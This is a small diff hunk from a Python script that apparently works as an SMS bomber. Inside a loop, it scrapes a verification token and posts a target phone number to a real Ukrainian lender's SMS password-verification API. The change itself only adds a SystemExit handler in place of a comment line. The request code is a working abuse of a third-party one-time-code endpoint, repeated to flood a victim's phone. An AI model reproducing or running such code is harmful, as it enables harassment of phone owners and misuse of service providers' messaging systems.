@@ -89,4 +89,6 @@ for _ in track(range(run)):
      pliskov_rvt = re.search(r'(?<=__RequestVerificationToken: ")[\d\w\-_]+', pliskov.text)[0]
      print('topcredit', self.request('https://admin.topcredit.ua/api/sms/password-verification/create', json={"phone": phone}))
      del pliskov, pliskov_rvt
-#---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+ except SystemExit:
+     exit()
